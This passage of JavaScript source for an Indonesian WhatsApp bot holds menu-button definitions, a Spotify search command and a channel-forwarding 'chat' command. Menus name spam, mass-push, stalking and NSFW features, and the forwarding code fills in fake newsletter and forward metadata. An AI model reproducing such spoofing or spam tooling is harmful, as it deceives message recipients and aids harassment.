        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'sspotify': {
    if (!text) return replyviex(`Masukkan judul lagu yang ingin Anda cari, Contoh: ${prefix + command} gala bunga mataharia`);
    
    m.reply('tunggu sebentar......'); 
    
    try {
        let response = await axios.get(`https://fgsi-spotify.hf.space/query=${encodeURIComponent(text)}`);
        let data = response.data;

        if (!data.status) return m.reply(`Error: ${data.msg}`);

        let { title, artist, duration, popularity, preview, thumbnail: thumbnailUrl, url } = data.result;
        let audioUrl = data.audio.url;

        const thumbnails = await axios.get(thumbnailUrl, { responseType: 'arraybuffer' });
        const thumbnail = Buffer.from(thumbnails.data, 'binary');

        await TradzSigma.sendMessage(m.chat, {
            image: thumbnail,
            caption: `🎵 *${title}*\n👤 *Artist:* ${artist}\n⏳ *Duration:* ${duration}\n✨ *Rate Song:* ${popularity}\n📌 *Preview:* ${preview || "No preview available"}\n🔗 *Spotify Link:* ${url}`,
        }, { quoted: qkontak });

        await TradzSigma.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: 'audio/mp4',
            fileName: `${title}.mp3`,
        }, { quoted: qkontak });

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat mengambil lagu dari spotify.");
    }
}
break
case 'randomvideomenubutton': {
let teks =`◤─「 \`RANDOM VIDEO\` 」─✦
│⦿ 〔 _.tiktokgirl_
│⦿ 〔 _.tiktoknukthy_
│⦿ 〔 _.tiktokkayes_
│⦿ 〔 _.tiktokpanrika_
│⦿ 〔 _.tiktoknotnot_
│⦿ 〔 _.tiktokghea_
│⦿ 〔 _.tiktoksantuy_
│⦿ 〔 _.tiktokbocil_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'upteks':
            case 'chat': {
                if (m.isGroup) return replyviex("Command hanya bisa di dalam private chat")
                if (!text) return await replyviex("Example: .chat Tradz Ganteng bgt")
                //m.reply("contoh\n.chat selamat siang semuanya")
                if (budy.match(`colmek|coli|desah|ah ah|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit|open bo|gay|yatim|62|mmk|6281513607731|081513607731|join|whatsapp.com|wa.me|t.me`)) return replyviex('maaf ada kata kata yang tidak sesuai.\nAturan\ndi mohon untuk tidak promosi barang/jasa, menyebarkan hoax, scam, berkata kasar, menyebarkan nomor WhatsApp, mengeshare link');
                const Kalender00011 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
                const owned11 = ownernumber + "@s.whatsapp.net"
                let awal = `anjir`
                await TradzSigma.sendMessage(m.chat, {
                    react: {
                        text: '🦚',
                        key: m.key,
                    }
                })
                TradzSigma.sendMessage(`${my.idch}`, {
                    text: `${text}`,
                    contextInfo: {
                        mentionedJid: [m.sender, owned11],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: `0@newsletter`,
                            newsletterName: `Jinshi MD`,
                            serverMessageId: -1
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: TradzSigma.decodeJid(TradzSigma.user.id)
                        },

                        forwardingScore: 999,
                        isForwarded: false,
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `pesan dari: ${pushname}`,
                            body: `fRoM: ${m.isGroup ? `${groupMetadata.subject}` : !m.isGroup ? "chat" : "Free User"}`,
                            thumbnailUrl: ppuser,
                            sourceUrl: `${text}`,
                            mediaType: 1,
                            renderLargerThumbnail: false
                        }
                    }
                })
                await delay(150)
                TradzSigma.sendMessage(m.chat, {
                    react: {
                        text: '🎉',
                        key: m.key,
                    }
                })
                replyviex(`sukses mengirim pesan ke channel.\n\ndengan teks: ${text}`)
                TradzSigma.sendMessage(m.chat, {
                    react: {
                        text: '🚮',
                        key: m.key,
                    }
                })
            }
            break
case 'newupdatebutton': {
let teks = `◤─「 \`NEW UPDATE\` 」─✦
│⟡ 〔 _.nglspam_
│⟡ 〔 _.bratvideo_
│⟡ 〔 _.chord_
│⟡ 〔 _.nulishitam_
│⟡ 〔 _.readmore_
│⟡ 〔 _.mcmap_
│⟡ 〔 _.aigen_
│⟡ 〔 _.romchat_
│⟡ 〔 _.animebrat_
│⟡ 〔 _.animebrat-vid_
│⟡ 〔 _.totalchat_
│⟡ 〔 _.hytamkan_ 
│⟡ 〔 _.totalfitur_
│⟡ 〔 _.superhd_
│⟡ 〔 _.youtubestalk_
│⟡ 〔 _.carimusic_
│⟡ 〔 _.antitagsw_
│⟡ 〔 _.enchard_
│⟡ 〔 _.buatlogo_
│⟡ 〔 _.chat_
│⟡ 〔 _.upch_
│⟡ 〔 _.rch [ with text ]_
│⟡ 〔 _.startjpmslide_
│⟡ 〔 _.ngl_
│⟡ 〔 _.giveaway_
│⟡ 〔 _.unreg_
│⟡ 〔 _.belipanel_
│⟡ 〔 _.shopmenu_
│⟡ 〔 _.deposit_ (semi otomatis)
│⟡ 〔 _.addsaldo_
│⟡ 〔 _.ceksaldo_
│⟡ 〔 _.buypanel_
│⟡ 〔 _.upch1_
│⟡ 〔 _.limit_
│⟡ 〔 _.addlimit_
│⟡ 〔 _.addmoney_
│⟡ 〔 _.resetlimit_
│⟡ 〔 _.toplimit_
│⟡ 〔 _.topmoney_
│⟡ 〔 _.resetmoney_
│⟡ 〔 _.cekmoney_
│⟡ 〔 _.mymoney_
│⟡ 〔 _.font_
│⟡ 〔 _.fontlist_
│⟡ 〔 _.saran_
│⟡ 〔 _.autoreadsw_
│⟡ 〔 _.backup_
│⟡ 〔 _.yta_ (audio)
│⟡ 〔 _.ytv_ (video quality)
│⟡ 〔 _.setautosholat_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
